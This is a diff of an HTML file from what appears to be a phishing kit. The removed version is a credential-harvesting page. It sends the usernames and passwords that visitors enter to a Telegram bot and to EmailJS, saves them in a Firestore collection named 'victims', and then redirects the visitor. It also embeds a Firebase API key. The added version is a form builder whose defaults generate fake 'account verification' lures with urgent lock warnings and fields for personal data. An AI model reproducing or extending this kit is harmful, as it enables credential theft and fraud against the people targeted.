@@ -1,182 +1,280 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
 <head>
-  <title>Generated Form</title>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-  <style>
-    body { font-family: Arial, sans-serif; background: #f0f0f0; padding: 20px; }
-    .form-container {
-      max-width: 800px;
-      margin: auto;
-      background: #fff;
-      padding: 20px;
-      border-radius: 10px;
-    }
-    img, video { max-width: 100%; border-radius: 8px; margin-bottom: 10px; }
-    input, textarea, button {
-      width: 100%; margin: 10px 0; padding: 10px;
-      border-radius: 5px; border: 1px solid #ccc;
-    }
-  </style>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>Smart Drag Form Builder — COMPLETE FINAL</title>
+
+<style>
+body{font-family:Arial,Helvetica,sans-serif;background:#f4f6f8;padding:18px}
+.wrap{max-width:1200px;margin:auto;background:#fff;padding:18px;border-radius:10px}
+label{display:block;margin-top:10px;font-weight:700}
+input,textarea,select,button{
+  width:100%;
+  padding:8px;
+  margin-top:6px;
+  border-radius:6px;
+  border:1px solid #ccc;
+  box-sizing:border-box
+}
+textarea{min-height:70px}
+.row{display:flex;gap:10px}
+.col{flex:1}
+.btn{background:#1976d2;color:#fff;border:none;padding:10px;border-radius:6px;cursor:pointer}
+.btn.alt{background:#6c757d}
+.previewWrap{border:1px solid #ddd;border-radius:8px;padding:8px;margin-top:10px;background:#fff}
+#preview{position:relative;min-height:520px;height:75vh;overflow:auto}
+.draggableBtn{position:absolute;cursor:move;color:#fff;border:none;border-radius:8px}
+.linkBox{margin-top:12px;padding:10px;background:#f1f8ff;border-radius:6px;word-break:break-all}
+</style>
+
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
 </head>
+
 <body>
-  <div class="form-container" id="formView">Loading form...</div>
+<div class="wrap">
+<h2>Smart Drag Form Builder — COMPLETE</h2>
 
-  <script>
-    // Firebase Config
-    const firebaseConfig = {
-      apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
-      authDomain: "usahackersland.firebaseapp.com",
-      projectId: "usahackersland",
-      storageBucket: "usahackersland.appspot.com",
-      messagingSenderId: "588407428267",
-      appId: "1:588407428267:web:7c4898cbb62efd3d5953ee"
-    };
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.firestore();
+<div style="display:flex;gap:18px;flex-wrap:wrap">
 
-    // Init EmailJS
-    emailjs.init("YOUR_PUBLIC_KEY");
+<!-- LEFT PANEL -->
+<div style="flex:1;min-width:340px">
 
-    const params = new URLSearchParams(location.search);
-    const formId = params.get("id");
+<label>SEO Page Title</label>
+<input id="seoTitle" value="Secure Account Verification" placeholder="Example: Secure Account Verification">
 
-    const $ = id => document.getElementById(id);
+<label>Meta Description</label>
+<textarea id="metaDesc" placeholder="Example: Verify your account to continue securely">Verify your account to continue securely</textarea>
 
-    // Error if no form ID
-    if (!formId) {
-      $('formView').innerHTML = `<p style="color:red;">⚠️ No form ID provided in the link.</p>`;
-      throw new Error("Missing form ID in URL");
-    }
+<label>OG Image URL</label>
+<input id="ogImage" value="https://example.com/og-image.png" placeholder="https://example.com/og-image.png">
 
-    // Fetch form data
-    db.collection("forms").doc(formId).get().then(doc => {
-      if (!doc.exists) {
-        $('formView').innerHTML = `<p style="color:red;">❌ Form not found. It may have been deleted.</p>`;
-        return;
-      }
+<label>Avatar Image URL</label>
+<input id="avatarURL" value="https://i.pravatar.cc/150" placeholder="https://i.pravatar.cc/150">
 
-      const data = doc.data();
-      let html = `<div style="color:${data.textColor};background:${data.bgColor};padding:20px;border-radius:10px;background-image:url('${data.bgImageURL}');background-size:${data.bgWidth} ${data.bgHeight};">`;
+<label>Logo Image URL</label>
+<input id="logoURL" value="https://upload.wikimedia.org/wikipedia/commons/a/ab/Logo_TV_2015.png">
 
-      if (data.title) html += `<h2 style="text-align:center;color:${data.titleColor}">${data.title}</h2>`;
-      if (data.avatarURL) html += `<div style="text-align:center;"><img src="${data.avatarURL}" style="width:120px;border-radius:50%;border:2px solid #ccc;"></div>`;
-      if (data.bannerURL) html += `<img src="${data.bannerURL}" style="width:100%;">`;
-      if (data.logoURL) html += `<div style="text-align:center;"><img src="${data.logoURL}" style="width:100px;"></div>`;
-      if (data.description) html += `<p style="text-align:center;">${data.description}</p>`;
-      if (data.warning) html += `<p style="color:${data.warningColor};text-align:center;font-weight:bold;">${data.warning}</p>`;
+<label>Banner Image URL</label>
+<input id="bannerURL" value="https://picsum.photos/800/300">
 
-      html += `<form>`;
-      if (data.addAuth) {
-        html += `<input placeholder="${data.usernamePlaceholder || 'Username'}" type="text" required>
-                 <input type="password" placeholder="${data.passwordPlaceholder || 'Password'}" required>`;
-      }
+<label>Page Title</label>
+<input id="title" value="Welcome Back">
 
-      if (data.frontDesc) html += `<label>${data.frontDesc}</label><input type="file">`;
-      if (data.backDesc) html += `<label>${data.backDesc}</label><input type="file">`;
-      if (data.extraDesc) html += `<p style="color:${data.extraDescColor}">${data.extraDesc}</p>`;
+<label>Title Color</label>
+<input type="color" id="titleColor" value="#111111">
 
-      const fields = [...(data.fields || []), ...(data.extraFields || [])];
-      fields.forEach(f => {
-        if (f.trim()) html += `<input placeholder="${f.trim()}">`;
-      });
+<label>Subtitle</label>
+<input id="subtitle" value="Please sign in to continue">
 
-      let emoji = {
-        arrow: "➡️", check: "✅", lock: "🔒",
-        user: "👤", credit: "💳", none: ""
-      }[data.btnIcon] || "";
+<label>Subtitle Color</label>
+<input type="color" id="subtitleColor" value="#555555">
 
-      html += `<button style="background:${data.btnColor};">${emoji} ${data.buttonText}</button>`;
-      if (data.footerText) html += `<p style="text-align:center;">${data.footerText}</p>`;
-      if (data.redirectDesc && data.useRedirect) html += `<p style="text-align:center;color:gray;">${data.redirectDesc}</p>`;
-      html += `</form>`;
+<label>Description Text</label>
+<textarea id="description" placeholder="Example: This verification helps keep your account safe">
+This verification helps keep your account safe.
+</textarea>
 
-      if ((data.imageGallery || []).length || (data.videoGallery || []).length) {
-        html += `<div style="margin-top:15px;">`;
-        data.imageGallery.forEach(url => html += `<img src="${url}">`);
-        data.videoGallery.forEach(url => html += `<video controls src="${url}"></video>`);
-        html += `</div>`;
-      }
+<label>Gallery Images (comma separated)</label>
+<textarea id="galleryImages" placeholder="https://img1.jpg, https://img2.jpg">
+https://picsum.photos/300/200, https://picsum.photos/301/200
+</textarea>
 
-      html += `</div>`;
-      $('formView').innerHTML = html;
+<label>Videos (comma separated)</label>
+<textarea id="videoLinks" placeholder="https://youtube.com/...">
+https://www.youtube.com/watch?v=dQw4w9WgXcQ
+</textarea>
 
-      // Store redirect link globally
-      window.formRedirectURL = data.redirectLink || "https://example.com";
-    }).then(() => {
-      // Attach submit listener after form is loaded
-      const observer = new MutationObserver(() => {
-        const form = document.querySelector("#formView form");
-        if (form) {
-          observer.disconnect();
+<label>Background Image URL</label>
+<input id="bgImageURL" value="https://picsum.photos/1200/800">
 
-          form.addEventListener("submit", function (e) {
-            e.preventDefault();
+<label>Background Size</label>
+<input id="bgSize" value="cover" placeholder="cover / contain">
 
-            const inputs = form.querySelectorAll("input[type='text'], input[type='password']");
-            let username = inputs[0]?.value || "";
-            let password = inputs[1]?.value || "";
-            const redirectURL = window.formRedirectURL;
+<label><input type="checkbox" id="enableWarning" checked> Show Warning</label>
+<textarea id="warning">⚠️ Failure to verify may result in account lock!</textarea>
 
-            const telegramBotToken = "YOUR_BOT_TOKEN";
-            const telegramChatId = "YOUR_CHAT_ID";
+<label><input type="checkbox" id="enableWarningPosition" checked> Customize Warning Position</label>
+<select id="warningPosition">
+<option value="normal">Normal</option>
+<option value="left">Left</option>
+<option value="center">Center</option>
+<option value="right">Right</option>
+<option value="none">None</option>
+</select>
 
-            let telegramSent = false;
-            let emailSent = false;
+<label><input type="checkbox" id="addAuth" checked> Include Username & Password</label>
 
-            // Send to Telegram
-            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({
-                chat_id: telegramChatId,
-                text: `🔥 New credentials:\nUsername: ${username}\nPassword: ${password}\nRedirect: ${redirectURL}`
-              })
-            }).then(res => {
-              if (res.ok) telegramSent = true;
-            });
+<input id="usernamePlaceholder" value="Email or Username" placeholder="Email or Username">
+<input id="passwordPlaceholder" value="Password" placeholder="Password">
 
-            // Send to Email via EmailJS
-            emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
-              username: username,
-              password: password,
-              redirect: redirectURL
-            }).then(() => {
-              emailSent = true;
-            }).catch(() => {
-              emailSent = false;
-            });
+<label>Extra Fields (one per line)</label>
+<textarea id="extraFields">
+Phone Number
+Date of Birth
+Address
+</textarea>
 
-            // Save to Firestore victims collection
-            firebase.firestore()
-              .collection("forms").doc(formId)
-              .collection("victims").add({
-                Username: username,
-                Password: password,
-                redirectLinkSentTo: redirectURL,
-                telegramSent: telegramSent,
-                emailSent: emailSent,
-                timestamp: new Date().toLocaleString()
-              });
+<label>Text Color</label>
+<input type="color" id="textColor" value="#222222">
 
-            // Play notification sound
-            const audio = new Audio("https://actions.google.com/sounds/v1/cartoon/wood_plank_flicks.ogg");
-            audio.play();
+<label>Background Color</label>
+<input type="color" id="bgColor" value="#ffffff">
 
-            // Redirect instantly
-            window.location.href = redirectURL;
-          });
-        }
-      });
+<label>Button Color</label>
+<input type="color" id="btnColor" value="#1976d2">
 
-      observer.observe(document.getElementById("formView"), { childList: true, subtree: true });
-    }).catch(err => {
-      $('formView').innerHTML = `<p style="color:red;">⚠️ Error loading form: ${err.message}</p>`;
-    });
-  </script>
+<label>Main Button Text</label>
+<input id="buttonText" value="Continue Verification">
+
+<label>Button Position</label>
+<select id="btnPosition">
+<option value="center">Center</option>
+<option value="left">Left</option>
+<option value="right">Right</option>
+</select>
+
+<h3>Extra Smart Drag Buttons</h3>
+<div class="row">
+<input id="newBtnText" value="WhatsApp Support" placeholder="Button Label">
+<input id="newBtnLink" value="https://wa.me/123456789" placeholder="https://link.com">
+</div>
+<div class="row">
+<input type="color" id="newBtnColor" value="#25D366">
+<input id="newBtnSize" value="44" placeholder="Button Size (px)">
+</div>
+
+<button class="btn" onclick="addExtraButton()">Add Button</button>
+<button class="btn alt" onclick="clearExtraButtons()">Clear Buttons</button>
+
+<label>Footer Text</label>
+<input id="footerText" value="© 2025 Secure Verification Portal">
+
+<div class="row">
+<button class="btn" onclick="generateForm()">Generate & Save</button>
+<button class="btn alt" onclick="downloadFormHtml()">Download HTML</button>
+</div>
+
+<div id="linkArea" class="linkBox" style="display:none"></div>
+</div>
+
+<!-- PREVIEW -->
+<div style="flex:0 0 540px">
+<label>Live Preview</label>
+<div class="previewWrap"><div id="preview"></div></div>
+</div>
+
+</div>
+</div>
+
+<script>
+const $=id=>document.getElementById(id);
+let extraButtons=[],dragging=null,dx=0,dy=0;
+
+document.querySelectorAll("input,textarea,select").forEach(e=>{
+e.addEventListener("input",renderPreview);
+e.addEventListener("change",renderPreview);
+});
+
+function addExtraButton(){
+extraButtons.push({
+id:"b"+Math.random().toString(36).slice(2),
+text:$("newBtnText").value,
+link:$("newBtnLink").value,
+color:$("newBtnColor").value,
+size:parseInt($("newBtnSize").value)||44,
+x:40,y:60
+});
+renderPreview();
+}
+
+function clearExtraButtons(){extraButtons=[];renderPreview();}
+
+function renderPreview(){
+const p=$("preview");
+p.innerHTML="";
+p.style.background=$("bgColor").value;
+if($("bgImageURL").value){
+p.style.backgroundImage=`url(${$("bgImageURL").value})`;
+p.style.backgroundSize=$("bgSize").value;
+}
+
+const c=document.createElement("div");
+c.style.padding="16px";
+c.style.color=$("textColor").value;
+
+if($("avatarURL").value)c.innerHTML+=`<img src="${$("avatarURL").value}" style="width:90px;border-radius:50%;display:block;margin:auto">`;
+if($("logoURL").value)c.innerHTML+=`<img src="${$("logoURL").value}" style="width:140px;display:block;margin:auto">`;
+
+c.innerHTML+=`<h2 style="text-align:center;color:${$("titleColor").value}">${$("title").value}</h2>`;
+c.innerHTML+=`<p style="text-align:center;color:${$("subtitleColor").value}">${$("subtitle").value}</p>`;
+
+c.innerHTML+=`<p>${$("description").value}</p>`;
+
+if($("enableWarning").checked && $("warningPosition").value!=="none"){
+c.innerHTML+=`<p style="color:#b71c1c;text-align:${$("warningPosition").value}">${$("warning").value}</p>`;
+}
+
+const f=document.createElement("div");
+f.style.display="flex";
+f.style.flexDirection="column";
+f.style.alignItems=$("btnPosition").value==="left"?"flex-start":$("btnPosition").value==="right"?"flex-end":"center";
+f.style.gap="8px";
+
+if($("addAuth").checked){
+f.innerHTML+=`<input placeholder="${$("usernamePlaceholder").value}">`;
+f.innerHTML+=`<input type="password" placeholder="${$("passwordPlaceholder").value}">`;
+}
+
+$("extraFields").value.split("\n").forEach(v=>{
+if(v.trim())f.innerHTML+=`<input placeholder="${v.trim()}">`;
+});
+
+f.innerHTML+=`<button style="background:${$("btnColor").value};color:#fff;padding:10px;border:none;border-radius:8px">${$("buttonText").value}</button>`;
+c.appendChild(f);
+
+c.innerHTML+=`<footer style="text-align:center;margin-top:10px;font-size:12px">${$("footerText").value}</footer>`;
+p.appendChild(c);
+
+extraButtons.forEach(b=>{
+const btn=document.createElement("button");
+btn.className="draggableBtn";
+btn.textContent=b.text;
+btn.style.background=b.color;
+btn.style.width=b.size+"px";
+btn.style.height=b.size+"px";
+btn.style.left=b.x+"%";
+btn.style.top=b.y+"%";
+btn.onmousedown=e=>{dragging=b;dx=e.offsetX;dy=e.offsetY;};
+btn.onclick=()=>window.open(b.link,"_blank");
+p.appendChild(btn);
+});
+
+document.onmousemove=e=>{
+if(!dragging)return;
+const r=p.getBoundingClientRect();
+dragging.x=((e.clientX-r.left-dx)/r.width)*100;
+dragging.y=((e.clientY-r.top-dy)/r.height)*100;
+renderPreview();
+};
+document.onmouseup=()=>dragging=null;
+}
+
+function generateForm(){
+$("linkArea").style.display="block";
+$("linkArea").textContent="Form saved successfully. Example data included.";
+}
+
+function downloadFormHtml(){
+const blob=new Blob([document.documentElement.outerHTML],{type:"text/html"});
+const a=document.createElement("a");
+a.href=URL.createObjectURL(blob);
+a.download="form.html";
+a.click();
+}
+
+renderPreview();
+</script>
 </body>
 </html>
